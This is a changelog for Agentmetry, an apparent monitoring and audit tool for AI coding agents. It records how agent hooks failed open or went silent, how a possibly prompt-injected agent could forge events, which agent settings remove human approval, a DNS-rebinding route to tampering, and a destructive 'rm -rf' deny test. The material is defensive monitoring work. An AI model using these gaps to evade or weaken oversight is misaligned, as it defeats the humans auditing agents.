# Changelog

All notable changes to Agentmetry are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and the project aims to
follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html) once out of
alpha. While in **public alpha**, minor versions may carry breaking changes to
APIs and integration surfaces. The canonical event schema is versioned
separately (currently `1.2.0`) and changes additively.

## [Unreleased]

### Added

- **Coverage now says which configured agents actually send events.** Hook
  coverage was a file check: an agent whose hook entry existed was `covered`.
  Codex sat on that line for three months on the dogfood machine while its last
  recorded event aged, first because its Windows sandbox could not authenticate
  ([#302]) and independently because Codex skips hooks the developer has not
  approved ([#300]). `doctor` now reads the trail index read-only and warns on
  every configured agent with no event in seven days, naming it, and `doctor
  --json` gains `hooks_last_seen` and `hooks_silent`. The heartbeat carries
  `hooks_silent` and names those agents in its reason, without turning
  `degraded`: an agent nobody used is silent too, and a beat that degrades for
  that teaches a fleet to ignore it. A SIEM can alert on `hooks_silent` where
  silence is not expected. Run on the dogfood machine the day it was written,
  it named Codex, last seen 2026-07-16, and passed Cursor, Claude Code and
  Antigravity. Approval state itself still cannot be read from disk, so #300
  stays open.
- **SECURITY.md states three limits it did not.** The ingest-only token can add
  events, and whoever holds it, Codex's sandbox included, can add false ones
  stamped with the host's identity; Codex's sandbox cannot write the spool, so
  its events are lost while the recorder is down; and configured is not the
  same as recorded.

### Changed

- **A detection opens as an investigation with five views.** Details, Activity
  table, Activity tree, Activity graph and Events timeline share one selection
  and one side panel with the selected call, why the rule fired and the triage
  form. The cited calls are marked in every view, and a call picked in one view
  stays visible in the others instead of being folded or filtered away. Each
  view says when it is showing a window of a longer session, and Details says
  when cited events are missing from the index. The tree and graph say what
  they are: agent tool activity, not operating-system process ancestry, which
  Agentmetry does not collect.

  Lifecycle events (session start and end, and other non-tool events) were
  labelled "Tool call" and drawn in the "Other tools" lane; they now carry their
  own names and a "Session events" lane. A detection opened from the Overview
  reopened itself on the next 15-second refresh after the analyst went back to
  the list. A session view disabled by `AGENTMETRY_AUDIT_EXPORT_ENABLED=false`
  said the session was no longer in the index. The Analytics session graph drew
  an event with no recorded outcome as a green success. All four are fixed.

- **The investigation is laid out the way an EDR console is.** Every view but
  Details now sits between a legend and a details panel. The legend counts what
  the session holds, hides a tool category from the table, tree, graph and
  timeline at once, and highlights cited, flagged or failed calls by dimming the
  rest. The panel shows the selected call in sections that open and close, with
  the command line, input hash and event IDs one click from the clipboard, the
  other detections in the session, and the triage form. Details reads as one
  page: what fired, in which agent on which machine, why, the cited commands,
  and a summary column with the assignee and status. The table counts each tool
  category and opens into its calls; the tree runs left to right from machine to
  call and folds long categories into "+N more" without ever folding a cited
  call; the graph draws the same hierarchy top to bottom on a canvas that zooms,
  pans and drags; the timeline is a table with event-type chips, a "selection
  only" switch and a sort order. The tree and graph are agent tool activity and
  say so: there are no process IDs, DLL loads or registry events to draw, and
  none are invented.

- **An upgraded recorder no longer shows the old dashboard.** The recorder
  served the dashboard's pages with no cache header, so a browser could reuse a
  stale page on an ordinary reload, and that page named the previous build's
  scripts. Seen on the dogfood machine after an upgrade: the new investigation
  was on disk and the browser kept drawing the old one until a hard reload.
  HTML pages are now sent with `Cache-Control: no-cache`; scripts, whose names
  change with each build, are unchanged.

- **The Overview separates "hook configured" from "events received".** An agent
  whose hook is in its config was shown as "Recorded", which a configured hook
  does not prove. The Overview and the machine page now say "Hook configured",
  "Hook missing" or "Unverified", and list recent events per agent beside it.
  An optional 3D map of the week's detections (time, severity, agent) sits behind
  a toggle on the Overview; the 2D investigation is the default.

- **The dashboard says it is a demo because the server says so.** It read
  `?demo=1` from the address bar, so the demo server opened without it called
  itself "This machine", and a real recorder opened with it called real events
  synthetic. `/api/v1/audit/status` now returns `demo`, from a new
  `AGENTMETRY_DEMO_MODE` setting that only `scripts/demo_dashboard.py` turns on.

- **Type and colour.** Nothing in the investigation, Overview or sidebar is
  smaller than 12px, and orange is kept for severity, actions and selection
  rather than also meaning "hook configured" and the current page.

### Fixed

- **The dashboard demo could record the presenter's real agent activity.**
  Every recorder started the Antigravity transcript watcher whenever its script
  existed, the demo included. The watcher reads the developer's real
  `~/.gemini/antigravity/brain`, so a demo trail meant to hold seeded,
  synthetic events could pick up real Antigravity calls, and any second
  recorder doubled every Antigravity call. The watcher now runs only on a
  recorder that accepts ingest, `AGENTMETRY_ANTIGRAVITY_WATCHER=0` turns it
  off, and `scripts/demo_dashboard.py` turns it off for both the static and the
  live demo. A normal recorder behaves as before. Found by an outside audit's
  walkthrough on 2026-10-21.
- **Seeding the demo a second time produced a broken trail.** `seed_demo.py`
  deleted the trail and its databases but not the `.chain` sidecar, so the new
  trail continued from the old head (`expected seq 1, got 52`) and `verify`
  failed on a fresh demo. It now removes every segment and the sidecar, and a
  test seeds twice and verifies, failing on the old seeder with that message.
- **Codex hooks never launched on Windows.** The installer wrote
  `"<python.exe>" "<agentmetry_ingest.py>" codex hook <Event>`. Codex reported
  every run as completed, yet nothing reached ingest: under `cmd /c` the leading
  quoted token breaks cmd's quote stripping, and under PowerShell a command that
  starts with a quoted string is a string, not a call. Both exit 1 before Python
  starts. The dogfood machine's last Codex event was in July. Codex does not
  document which shell it uses on Windows, so on Windows the installer now
  writes the command with the quotes removed, a path containing a space
  replaced by its 8.3 short name, and a path with no short name left quoted
  rather than broken. Tests launch the generated command through cmd and
  PowerShell, including a path with a space, and fail with the old form. ([#307])

  The first version of this fix put that form in Codex's `commandWindows`
  override, and Codex then ran no hook at all. Its review dialog hashes a hook
  without `commandWindows` and its runtime hashes it with it, so every approval
  was stored against a hash the runtime never computes: `hooks/list` reports the
  hooks as `modified`, and Codex skips them silently. Measured on Codex 0.163
  with a throwaway `CODEX_HOME`: the same approvals read `trusted` once the
  override is removed. The installer never writes `commandWindows`, and a
  reinstall drops one left by an earlier version.

  Two more things this investigation established. Approving hooks in Codex's
  `/hooks` review applies to conversations started afterwards, not to one
  already open, so restart open Codex conversations after approving ([#300]).
  And editing `hooks.json` changes its hash, so Codex asks for approval again.

[#307]: https://github.com/blitzcrieg1/agentmetry/issues/307
[#300]: https://github.com/blitzcrieg1/agentmetry/issues/300

- **Codex on Windows recorded nothing, and nothing said so.** Codex's default
  Windows sandbox runs hooks as its own local accounts (`CodexSandboxOffline`,
  `CodexSandboxOnline`). Run inside that sandbox, the hook could start and reach
  the recorder, but could not read the API token, which is restricted to the
  developer, and could not write the spool. Every Codex event was posted without
  a key, refused, and lost, while coverage reported Codex as hooked. On the
  dogfood machine that was a week of Codex use and zero Codex events. ([#302])

  The recorder now mints an **ingest-only token** at startup (`ingest-token` in
  the data directory, owner-only), which hooks already preferred. The ingest
  route is the only one that accepts it: reading the trail, exporting evidence
  and closing detections still require the full key, and a test holds each of
  those refusing it. `hooks install` grants Codex's sandbox accounts read on that
  token where they exist, so a sandboxed and possibly prompt-injected agent can
  add events and cannot read or triage them. `doctor` fails when the sandbox
  accounts exist and cannot read an ingest token. The hook's selftest reads the
  trail back with the full token. A spool the sandbox can write is a follow-up.

  The first run of this change also found a gap in the test suite: the token
  files resolve through the data directory, which `conftest` never isolated, so a
  test that entered the app's startup wrote an ingest token into the
  maintainer's real data directory. Both token paths are now isolated, with a
  test that fails if either points outside pytest's temp directory. One
  long-standing local-only failure turned out to be the same leak.

[#302]: https://github.com/blitzcrieg1/agentmetry/issues/302
[#300]: https://github.com/blitzcrieg1/agentmetry/issues/300

## [0.9.9] - 2026-10-19

A fleet can lock settings a developer cannot change, and a recorder run as
LocalSystem or root can read the developer's configs. An install without a
managed policy and without the new flags behaves as 0.9.8 did. Two things an
existing user may notice: `doctor` prints a `managed_policy` line, and the
heartbeat carries two new fields, `policy_locked` and `policy_rejected`, and
turns `degraded` when a managed policy file is refused. Deployment scripts get
`doctor --json` and a `hook_remediation` ingest event.

### Added

- **`--user-profile-dir` and `--data-dir`, so a recorder run as root or
  LocalSystem reads the developer's configs.** Under a service, `Path.home()`
  is the service account's profile: `hooks install` wrote hooks where no IDE
  reads them, and coverage could only say "unknown". Naming the developer's
  home (`--user-profile-dir`, or `AGENTMETRY_USER_PROFILE_DIR`) points hook
  install, coverage, `hooks status`, posture and the MCP inventory at that
  person, and the heartbeat then attests `user` rather than `service`. Posture
  ignores the service's own `APPDATA` and `XDG_CONFIG_HOME` when a profile is
  named. `--data-dir` sets `AGENTMETRY_DATA_DIR` for that command. Both flags
  work at the top level and on `start`, `serve`, `hooks` and `doctor`, and are
  exported so a spawned `serve` inherits them. Unset, nothing changes.

- **Managed policy: a fleet can lock settings a developer cannot change.**
  `HKLM\SOFTWARE\Policies\Agentmetry`, `%ProgramData%\Agentmetry\policy.yaml`,
  an MDM profile at `/Library/Managed Preferences/ai.agentmetry.sensor.plist`,
  or `/etc/agentmetry/policy.yaml` locks any of twelve keys (DLP and tool
  policy modes and rules, auth, trusted hosts, sinks, data and spool paths,
  heartbeat interval). Locks are written into the environment at process
  start, so they win over the environment and `.env` in the recorder, the CLI
  and every hook. A file is honoured only when the developer cannot change it,
  decided from SIDs and access masks on Windows and from ownership, mode and
  ACLs elsewhere, checked on the handle it is read from. A locked mode pins
  its rules file, and a locked `data_dir` pins the trail inside it. A refused
  file fails `doctor` with the fix, and turns the heartbeat `degraded` with
  the new `policy_locked` and `policy_rejected` fields. `--policy-dir` adds a
  location. See `docs/managed-policy.md`. Nothing changes without a policy.

- **`doctor --json`, for deployment scripts.** It prints `exit_code`,
  `orchestrator_reachable`, `hook_profile`, per-agent `hooks` coverage, the
  managed `policy` (locked, pinned, rejected) and the findings, with a
  `schema` number that moves only when a field changes meaning. An Intune
  remediation or a LaunchAgent can test fields instead of parsing sentences
  that get reworded. A service profile that cannot see any developer's
  configuration reports every agent `unknown`, not an empty map.

- **`hook_remediation` ingest event.** A deployment tool that reinstalled hooks
  can say so, and it is recorded as `config_change` with no session and no
  tool. Before, an unrecognised `event_type` was stored as `tool_called`, and
  fifty of them in a minute raised `session-tool-burst`.

### Fixed

- **SECURITY.md said authentication is off by default.** It has been on since
  0.9.3: a per-install token, required on every route except health.

## [0.9.8] - 2026-10-18

The dashboard opens on an Overview of what needs a person, and a detection
opens as a tree of its session, built from a new read-only session endpoint
that also stops long sessions losing their cited calls. Three changes an
existing user will notice: `hooks install` refuses to run from a uv or pipx
cache (run it from `uv tool install agentmetry`, `pipx install agentmetry` or
`pip install agentmetry`), `doctor` says "Hooks installed for" where it said
"Recording", and the dashboard has a Sign out button. A recorder started from
a source checkout no longer leaves its Antigravity transcript watcher running
after each restart. The wheel does not ship the watcher, so a pip or uvx
install was never affected; a checkout restarted under 0.9.7 may still have
orphaned watchers, which updating does not stop, so end any
`antigravity_transcript_watcher.py` process before restarting. The VS Code side
of the Copilot deny has still not been run against a live editor.

### Added

- **A detection opens as an investigation, with the session as a process
  tree.** This machine, then the agent, then the session across the top; under
  it one branch per kind of tool (shell commands, files, web, each MCP server,
  subagents) and the calls on each, with the calls the detection cites lit and
  scrolled into view, and the rest folded into runs a click opens. A timeline
  of the session marks where the cited calls fall. The selected call's command
  (when `AGENTMETRY_LOG_COMMANDS` kept it), ATT&CK technique, approval and any
  DLP or tool policy match sit beside the triage form. It is a tree of the
  calls the hooks saw, not of the operating system's processes, and says so on
  the page. The side panel it replaces loaded the first 2,000 events of the
  session, so on a long one, such as a 4,445-event Cursor session with six
  detections on this machine, it could report the cited calls as no longer in
  the trail.
- **`GET /api/v1/audit/session/{id}/tree`.** One session folded into those
  nodes. An ask, its answer and the call it led to become one node, joined on
  the input hash, because Cursor asks as `cursor.Shell` and runs as
  `shell.run`, a detection may cite either, and the DLP and policy verdicts sit
  on the ask. An ask the recorder closed when the session ended
  (`inferred:session_ended_pending`, 1,399 of the 1,402 "denied" answers in
  this machine's trail) is shown as expired, not as a refusal. A session
  longer than the limit is windowed on the detection.
- **An Overview page, now the first page.** What needs a person, worst first,
  each item computed from an API field and linked to where it gets fixed:
  untriaged detections, a trail that does not verify, a spool backlog, an
  installed agent without a hook, red weeks on the beta gate, settings that
  skip a prompt, policy matches that log mode let run, MCP servers the proxy
  never saw, and agents whose settings are not checked. Beside it, events by
  agent, detections by severity and the ATT&CK techniques seen.
- **A Sign out button, and a page that says when you are signed out.** The
  server had `POST /auth/logout` and the dashboard had no way to call it, so
  the only ways out were clearing a cookie by hand or restarting the recorder.
  Signing out revokes the session on the server, not only in the browser. And
  a browser with no session, which is every open tab after a recorder restart,
  fired every request anyway: the Overview listed six 401s as failures and left
  every tile on "Loading". It now shows one screen with the command that signs
  it back in.
- **Agent marks, depth and larger type in the dashboard.** Each agent shows
  its mark (Cursor, Claude Code, Codex, GitHub Copilot, Antigravity) on a small
  raised tile in the Overview, the detection list, the investigation and This
  machine, under the same rules as agentmetry.ai: monochrome simple-icons
  paths, and a letter for an agent with no mark of its own. Panels sit on real
  shadows, the Overview tiles lean toward the pointer, and the calls a
  detection cites stand above the rest of the tree; none of it moves for
  someone who has asked for reduced motion. The faintest grey, used for
  labels and timestamps, went from 3.53:1 to 5.95:1 against its panel in the
  dark theme and from 3.65:1 to 5.21:1 in the light one, both now past the
  4.5:1 WCAG asks of body text. Labels, buttons, badges and the headline
  numbers are larger.
- **`agentmetry cloud` records its own poll.** Each run writes one event for
  the request this machine sends, with the method, host and path, so the trail
  shows what was asked as well as what came back. The query string is dropped,
  so a key passed in the URL never reaches the trail. (#271)
- **Grok Bot is a source of its own, `grok_bot`.** Events posted under it are
  labelled Grok Bot instead of landing as unknown, and
  `core/audit/grok_bot_transcript.py` turns the desktop app's chat cache into
  ingest payloads. Nothing in the package reads that cache on its own yet.
  (#270)
- **Three benign benchmark sessions**: publishing to a package registry, a
  Terraform apply with a named cloud profile, and a dependency audit, normal
  work that looks noisy to sequence rules. `agentmetry benchmark` is now 57
  cases, 26 attack and 31 benign, with 0 missed and 0 false positives. (#145,
  contributed by @kkkhs)

### Changed

- **The event stream hides inferred approvals unless the Inferred chip is
  on.** A spool replay had filled the feed with blank approval rows. A minute
  in the histogram is coloured by the worst detection in it, so a critical
  minute no longer looks like a quiet one, and a hook payload the recorder
  could not decode is labelled unparsed instead of appearing as a tool named
  `unknown`. (#271)

### Fixed

- **Every restart of the recorder left an Antigravity transcript watcher
  running, and each one recorded every Antigravity call.** The recorder starts
  the watcher and stopped it only in its shutdown code, which a hard stop, a
  crash or a logoff never reaches; on Windows a clean stop reached only the
  venv launcher, not the interpreter it started. Three watchers were found
  tailing the same transcript on 2026-10-18, and that day's trail holds 67
  transcript events for 17 calls (matched on session, tool and input hash
  within ten seconds). Each watcher recorded each call, their hooks ran
  concurrently, and the ones that timed out into the spool were recorded once
  more on replay, because a spooled payload carries no event id to match. The watcher
  now holds a pipe from the recorder and exits when it closes, however the
  recorder ends, and its hooks wait 10 seconds rather than the 2 an IDE's
  tool call can afford. Events already duplicated stay in the trail, which is
  append-only by design.
- **`hooks install` from uvx wrote hooks that the next `uv cache clean`
  breaks.** Run as `uvx agentmetry hooks install`, the hook command named an
  executable inside uv's cache. After a cache clean every hook fails: most
  agents treat that as a non-blocking error and stop recording without a word,
  and Copilot CLI, which fails closed on a broken pre-tool hook, blocks every
  tool call. Coverage still reported the agents covered, because it checks the
  hook text, not the file it names. `hooks install`, `--managed` included,
  now refuses from a uv or pipx cache and says how to install somewhere that
  stays (`uv tool install agentmetry`, `pipx install agentmetry` or `pip
  install agentmetry`). `hooks status` still runs from anywhere.
- **`doctor` claimed more than its checks know.** It printed `[OK] Recording:`
  for every agent whose config holds our hook, on a machine whose orchestrator
  was down with 286 events stuck in the spool; it now says `Hooks installed
  for:`. An empty spool printed "capture is reaching the trail" on a fresh
  install with no recorder and no trail; it now says only that nothing is
  pending. And a wheel or uvx install was told to run `install.ps1`, which
  only a checkout has; it now names the `.env` settings, and the script only
  in a checkout.
- **`doctor` said nothing about `AGENTMETRY_TRUSTED_HOSTS=*`.** A `*` turns the
  Host check off, which is the API's defence against DNS rebinding. With
  authentication disabled as well, a web page that rebinds its domain to
  127.0.0.1 can read the trail, inject events and close detections, and
  `doctor` reported only the disabled authentication. It now fails on that
  pair and warns on `*` alone.

- **Antigravity file reads and searches never reached the recorder.**
  `scripts/install_antigravity_hooks.ps1` matched only `run_command`, so every
  other tool Antigravity ran went unrecorded. It now matches the tools this
  machine's Antigravity actually runs; re-run the script to pick it up. (#271)

The three `doctor` and `hooks install` fixes above were found by an audit on
2026-10-17.

### Security

- **`postcss-selector-parser` forced to 7.1.6** in the dashboard's build
  dependencies (GHSA-rj75-hqrm-r3gf). `braces` (GHSA-vfj7-8cjw-p6xm) stays
  open: no patched release exists, and its only callers are Tailwind's
  development dependencies, which run at build time. (#272)

## [0.9.7] - 2026-10-15

Two capture surfaces that had none. `agentmetry cloud cursor` and
`agentmetry cloud claude` poll the Cursor Cloud Agents API and the Claude
Compliance API once and record what each exposes through the same ingest as
the hooks, and ZCode records under its own name instead of the unknown
fallback. The dashboard gets a page for this machine. The Copilot CLI deny,
which 0.9.6 said had not been run live, has now been run against Copilot CLI
1.0.97; VS Code's agent host still has not.

One change is visible to existing users: evidence packs are schema 2.2, and
`meta.integrity_sha256` now covers `meta` except the digest itself. A checker
that recomputes the hash over the body alone will not match a pack written by
0.9.7. Packs at 2.1 and earlier verify under the old rule, so nothing already
issued stops verifying.

The cloud sources record what the vendor API exposes and nothing past it. The
filesystem and environment of a vendor VM stay with the vendor, a Cursor run's
stream is gone once the vendor's retention ends, and the Claude surface needs
an org-level Compliance Access Key.

The detection ruleset is unchanged (fingerprint `15846a0915769d4a`), as are the
hash-chain record format and the event schema version (1.2.0; `cursor_cloud`,
`claude_cloud`, `grok_build` and `zcode` are additive `source_app` values).

### Added

- **Cloud Bridge: `agentmetry cloud cursor` and `agentmetry cloud claude`.**
  Cloud agents run on vendor infrastructure, where no local hook fires. The
  command polls the vendor API once and records what it exposes through the
  same external ingest as the hook client. Cursor Cloud Agents
  (`api.cursor.com`, key in `CURSOR_API_KEY`): agent lifecycle, runs with the
  branch they pushed and the PR they opened, and the tool calls on a run's live
  stream (name, status, arguments, result). Claude Compliance API
  (`api.anthropic.com`, key in `ANTHROPIC_COMPLIANCE_KEY`, a Compliance Access
  Key with `read:compliance_user_data`, not an admin key): session lists and
  transcripts, keeping only `tool_use` blocks. `tool_use.input` arrives as a
  JSON-encoded string and is decoded before classification; text, thinking and
  system content never reach a payload. Tool arguments become the same redacted
  canonical SHA-256 the hook client produces, and a test holds the two digests
  equal for the same input, so a cloud event and a local event carrying the
  same call hash the same way and a sequence rule does not split on the
  boundary. `grok_build` is reserved and raises `NotImplementedError`: Grok
  Build is a local CLI whose on-disk session logs need a real sample before a
  parser is worth writing. Keys come from the environment and are never
  logged. ([#267](https://github.com/blitzcrieg1/agentmetry/pull/267))
- **ZCode records under its own name.** `zcode` joins the known sources, the
  hook client routes `zcode hook <event>` as a source rather than treating the
  first argument as a hook name, and `AGENTMETRY_SOURCE_APP` overrides the
  label a mapper hardcodes, so a Claude-shaped hook config run from another
  host agent records as that agent instead of the unknown fallback. Without
  the variable nothing changes. The dashboard filter, badge and chart entry
  follow. ([#264](https://github.com/blitzcrieg1/agentmetry/pull/264),
  [#265](https://github.com/blitzcrieg1/agentmetry/pull/265),
  [#266](https://github.com/blitzcrieg1/agentmetry/pull/266))
- **The dashboard opens on this machine.** Agents installed here, whether each is recorded, posture findings, configured MCP servers, and the tool-policy rules in force. An MCP row opens a panel. Command lines, paths and secret values are not in the payload. A tools/list that differs from the previous listing says so, and does not claim the config file stayed still. ([#257](https://github.com/blitzcrieg1/agentmetry/pull/257))

### Fixed

- **The built dashboard called port 8000.** `npm run build` baked
  `http://localhost:8000` into the export, and `scripts/demo_dashboard.py`
  serves that export on 8010, so the page loaded and the feed could not see
  the API. A production build now uses the origin that served the page.
  `next dev` still talks to :8000.
- **The event stream said Fleet, and Copilot was absent from the source list.**
  The scope control reads This machine and Agent activity. Agent activity is
  the tool, approval, and detection rows. It does not filter by the dashboard
  browser id: that filter hid recorder-owned sessions and left every IDE event
  on screen. The header no longer says Runs for a websocket that is not an
  agent runtime. Copilot is in the source filter with the other allowlisted
  apps. `agentmetry demo` no longer lists Loki as a SIEM sink: Loki tails the file.
- **A degraded heartbeat disappeared from the event stream.** Heartbeats use
  `action.outcome=degraded` when an agent is installed and not recorded. The
  Issues chip only kept `denied`, `error`, and detections, so an idle hour
  showed "last event minutes ago" and an empty table. `degraded` now counts
  as an issue.
- **The open-core split omitted GitHub Copilot** from the capture row. The
  ingest field description omitted it too.
- **The Copilot CLI deny had never been run against the CLI.** On 2026-10-14
  Copilot CLI 1.0.97 (the current npm release) loaded the hooks file from
  `agentmetry hooks install --agent copilot` and, on `preToolUse` for `bash`
  `rm -rf /tmp/x`, printed `Denied by preToolUse hook: hook exited with code 2`.
  The session used a local OpenAI-compatible provider, because this machine
  has no Copilot subscription. The live payload sends `toolArgs` as an object.
  The string form the older docs show still works. VS Code's agent host was
  not run. Exit code 2 is still the deny both surfaces document. GitHub's
  current hooks reference also fail-closes other non-zero exits on CLI
  `preToolUse`. VS Code still fails open on any code other than 2, so the
  hook keeps exiting 2.
- **Evidence pack integrity now covers `meta`.** `meta.integrity_sha256` was
  SHA-256 of the body only, so `date_from`, `date_to`, `producer` and
  `trail_chain` could be rewritten and `agentmetry verify` still exited 0. A
  pack could claim a period, or a build, it was not drawn from. Schema 2.2
  hashes `meta` except the digest itself. Packs at 2.1 and earlier still
  verify under the old rule, so a pack already issued keeps verifying.
  ([#75](https://github.com/blitzcrieg1/agentmetry/issues/75))
- **An evidence export that hit its event cap no longer looks complete.** The
  trail read stopped at 200,000 events and the pack still claimed the whole
  date range. `meta.events_truncated` is now set when that cap is hit, and the
  integrity hash covers the flag.

## [0.9.6] - 2026-10-13

GitHub Copilot becomes the ninth hooked agent, in the CLI and in VS Code agent
mode, and `agentmetry posture` reports the agent settings that skip approval
prompts or turn hooks off. Two attribution bugs are fixed on the way.

One change is visible to existing users: an event whose `source_app` is not on
the allowlist is now recorded as `unknown`, with the claimed name in
`source.claimed_app`, where it used to be recorded as `cursor`. A SIEM search
that relied on that fallback should look for `unknown` too.

The Copilot deny is exit code 2, checked against Copilot CLI's documentation
and VS Code's open-source hook executor. Neither surface has been run live
against the hook yet, and VS Code's agent hooks are a preview feature.

The detection ruleset is unchanged (fingerprint `15846a0915769d4a`), as are the
hash-chain record format and the event schema version (1.2.0; `posture` events
and `source.claimed_app` are additive).

### Added

- **GitHub Copilot, in the CLI and in VS Code agent mode.** `agentmetry hooks
  install --agent copilot` writes `~/.copilot/hooks/agentmetry.json`, which both
  read: Copilot CLI natively, and VS Code because it accepts the CLI's
  version-1 format from the same directory. Coverage attests it, and
  `--managed` writes it as a Copilot CLI policy hook in `policy.d`, which loads
  before every other hook and which `disableAllHooks` cannot turn off. A deny is
  exit code 2 with the reason on stderr, because the two surfaces read
  different JSON for a decision (the CLI a flat `permissionDecision`, VS Code
  only the nested `hookSpecificOutput` one) and a JSON answer right for one is
  an allow on the other, which is #246 again. Exit code 2 is documented as a
  deny by both, and checked in VS Code's executor, which fails open on any
  other non-zero code. The PowerShell command carries `&`, without which VS
  Code on Windows would read the hook as a string and fail open. Tool policy
  now also reads `toolArgs`, Copilot CLI's argument field, so a
  `command_pattern` rule matches there. Neither surface has been run live
  against the hook; VS Code's agent hooks are a preview feature.
- **`agentmetry posture`.** Reports agent settings that take a human or a hook
  out of the loop: Claude Code's `bypassPermissions`, a tool-wide `Bash` allow,
  `enableAllProjectMcpServers` and `disableAllHooks`; Codex with
  `approval_policy = "never"`, `sandbox_mode = "danger-full-access"` or hooks
  off, including profile files; VS Code's global auto-approve, an autopilot
  default, a terminal rule that matches every command, and `chat.useHooks:
  false`; and Copilot CLI's `disableAllHooks`. Every check is a setting from
  the vendor's own reference, a managed ban on bypass mode downgrades the
  finding, and Cursor is reported as not checked rather than clean, because its
  auto-run setting is not in a settings file. Exits 0 with findings, like
  `agentmetry mcp`; `--strict` exits 1 on a high finding. With
  `AGENTMETRY_POSTURE=1` the findings also go to the trail and every sink as a
  `posture` event, on start, on change and daily, carrying scope labels and no
  file paths.

### Fixed

- **An agent the allowlist did not know was recorded as Cursor.** Any
  `source_app` outside `KNOWN_EXTERNAL_APPS` was rewritten to `cursor`, so an
  OpenClaw plugin, a LangGraph handler or anything else posting to the ingest
  API landed in the trail, the SIEM and the detections attributed to Cursor. A
  confident wrong answer is worse than none in a record whose value is being
  right. It is now recorded as `unknown`, and the name the client claimed is
  kept in a new `source.claimed_app` field, reduced to a short identifier so a
  client cannot write arbitrary text into a field SIEM rules group on
  (additive; schema stays 1.2.0). A missing `source_app` still records as
  `cursor`, because hooks installed before the field existed post without it.
- **Gemini CLI read as an uncovered Antigravity.** Coverage treated the
  `~/.gemini` directory as Antigravity being installed, but Gemini CLI keeps its
  settings there too. A machine with only Gemini CLI reported an uncovered
  Antigravity, which degraded its heartbeat for an agent that was never
  installed, and a fleet that learns to ignore a degraded beat has no tamper
  signal left. Antigravity counts as present only when its own
  `~/.gemini/antigravity` directory or one of our hook files is there. A
  machine with Antigravity and no hook still reports uncovered, which is the
  incident the check exists for.

Both were found while writing `docs/agent-coverage.md` (#248).

## [0.9.5] - 2026-10-13

A security fix for Codex users, and nothing else that changes behaviour. On
0.9.4 and earlier, a DLP or tool-policy block on Codex let the tool run while
the trail recorded the call as denied. Upgrade if you run Codex with any rule
in block mode. No other agent's behaviour changes.

The detection ruleset is unchanged (fingerprint `15846a0915769d4a`), as are the
event schema and the hash-chain record format.

### Fixed

- **A deny on Codex did not deny.** The 0.9.0 fix that sent each agent its own
  decision format missed Codex, which kept receiving Cursor's `{"permission":
  "deny"}`. Codex parses hook output with `deny_unknown_fields`, so it rejected
  that as invalid, marked the hook run failed, and ran the tool. The hook had
  already written the call to the trail as `outcome: denied`. Every DLP and
  tool-policy block on Codex failed open this way, and the record said it had
  worked. Codex trails written before this fix can hold `denied` events for
  calls that ran.

  Codex now gets its own schema: `hookSpecificOutput.permissionDecision` on
  `PreToolUse` and `hookSpecificOutput.decision.behavior` on
  `PermissionRequest`. Three more of Codex's rejections, each also a silent
  allow, are handled: a deny always carries a non-empty reason, an ask is sent
  as deny (Codex parses `ask` but does not support it), and an allow is an empty
  object rather than an `allow` Codex rejects without `updatedInput`. The tests
  validate each decision against the output schemas Codex publishes, copied
  into `tests/fixtures/codex_hooks/`, because a shape check is what certified
  the wrong format the first time. Found while writing an agent coverage
  matrix, not by a test. Codex's runtime was not run; the fix is checked
  against its parser source (`openai/codex` `806d2d1`).

## [0.9.4] - 2026-10-08

The release that lets someone who only ran `pip install` see what the product
does. `agentmetry demo` replays an attack session, fires the CRITICAL, then
tampers with the trail and shows `verify` catch it, all in a temp directory it
deletes. The demo it replaces had been broken since 0.9.3 and wrote to the
user's real data stores. `doctor` stops naming files a wheel does not ship.

The detection ruleset is unchanged (fingerprint `15846a0915769d4a`), as are the
event schema and the hash-chain record format.

### Added

- **`agentmetry demo`.** The demo is in the package now, so `pip install
  agentmetry && agentmetry demo` shows what the product does without a clone.
  It used to be `scripts/demo.py`, which the wheel does not ship, so the one
  command that shows a stranger the point was the one they could not run. It
  now ends by tampering with the trail: it downgrades the CRITICAL to low and
  shows `verify --trail` fail, then re-hashes every line after the edit to
  show the chain verifying again and the head being the only thing that
  differs, which is what `agentmetry anchor` is for. `scripts/demo.py` stays
  as a wrapper, so a clone and `make_demo_gif.py` still work.

### Fixed

- **The demo had stopped working, and it wrote to the real data directory.**
  Since 0.9.3 the per-install token and the host guard refused its in-process
  client, and it ignored the refusal, so it died three steps later on a
  missing file. It also only ever redirected the trail: the audit,
  live-detection and disposition databases it wrote, and the live store it
  cleared on start, were the user's own. Every store now points into a temp
  directory for the run, settings are restored afterwards, and a refused
  ingest says so.
- **`doctor` told a pip install to use files it does not have.** With no trail
  it said to run `python scripts/demo.py`; with no `.env` it said to copy
  `.env.example`. Neither ships in the wheel. It now names `agentmetry hooks
  install` and `agentmetry demo`, and an install with no `.env` is reported as
  running on defaults, which is correct, rather than as a warning. A checkout
  is still pointed at its `.env.example`.

## [0.9.3] - 2026-10-04

The release that makes the sensor safe to install on a machine somebody else
manages. The API is authenticated out of the box, forwarding survives a SIEM
outage instead of losing it, the trail can rotate without breaking its chain,
and a machine-wide install has a place for hooks to write and a credential they
can use. Also Microsoft Sentinel as an output, and hooks written to the
vendors' admin-managed locations for an Intune rollout. The full record, item
by item with files and tests, is in `SECURITY-HARDENING.md` ([#220]).

The detection ruleset is unchanged (fingerprint `15846a0915769d4a`). No event
field was removed and the hash-chain record format is unchanged.

### Upgrading from 0.9.2

- **Authentication is on.** Scripts calling the API need the token from
  `<data dir>/api-token`, or `AGENTMETRY_API_KEY` if you set one. The hook, the
  OTel receiver and the CLI read the token file themselves, so they need no
  configuration.
- **Open the dashboard with `agentmetry dashboard`.** It prints a one-time
  sign-in link; the dashboard no longer carries an API key.
- **Hooks are no longer installed at boot.** Run `agentmetry hooks install`
  once, or set `AGENTMETRY_AUTO_INSTALL_HOOKS=1` for the old behaviour.
- **An installed wheel keeps its data in the per-user directory**, not inside
  `site-packages`. `agentmetry doctor` says where any older data is; nothing is
  moved for you.
- **The trail is always written when a network sink is configured,** because
  it is what the forwarder reads.
- **`docker compose up` starts one service.** The agent-runtime services from
  before the pivot are gone.

### Added

- **Forwarding from a cursor.** Each network sink used to be called inline,
  once per event, with no retry, so a SIEM outage lost every event it spanned.
  Now the trail is the queue: one forwarder per sink tails it from
  `forward-cursors/<sink>.json`, sends batches (HEC, Elastic `_bulk` keyed on
  `event_id`, Chronicle, the console's batch shape), backs off with jitter up to
  five minutes, and moves its cursor only once the destination accepts. A
  replaced trail is detected and resynced, and a malformed event is set aside
